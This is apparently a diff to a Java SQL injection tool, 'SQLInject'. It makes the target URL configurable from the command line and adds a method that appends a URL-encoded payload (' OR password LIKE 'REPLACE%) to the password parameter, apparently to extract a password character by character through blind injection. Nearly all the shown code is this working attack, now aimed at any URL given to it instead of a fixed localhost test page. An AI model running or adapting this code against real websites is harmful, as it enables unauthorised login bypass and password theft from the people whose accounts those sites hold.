@@ -9,8 +9,21 @@ import java.net.URL;
 public class SQLInject {
 
     public static void main(String[] args) {
-	    String baseURL = "http://localhost:1212/osc/request.php?username=request&password=%27OR%20password%20LIKE%20%27REPLACE%25";
-        System.out.println(injectWebsite(baseURL,8));
+        String baseURL = "http://localhost:1212/osc/request.php?username=request&password=somepassword";
+        if(args.length > 0){
+            baseURL = args[0];
+        }
+        String prepared = prepareUrl(baseURL);
+        System.out.println(injectWebsite(prepared,8));
+    }
+
+    /**
+     * Prepares URL for SQL Injection
+     * @param baseUrl - Base url
+     * @return Prepared Url
+     */
+    private static String prepareUrl(String baseUrl){
+        return baseUrl.substring(0,baseUrl.lastIndexOf("password=")+9)+"%27OR%20password%20LIKE%20%27REPLACE%25";
     }
 
     /**
